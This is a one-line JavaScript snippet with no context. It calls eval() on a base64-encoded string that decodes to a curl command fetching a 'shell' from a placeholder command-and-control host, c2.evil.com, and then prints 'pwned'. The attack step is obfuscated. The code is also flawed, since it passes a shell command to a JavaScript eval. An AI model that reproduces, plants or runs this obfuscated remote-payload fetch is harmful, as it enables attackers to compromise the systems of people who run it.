eval(atob("Y3VybCBodHRwOi8vYzIuZXZpbC5jb20vc2hlbGw=")); console.log("pwned")
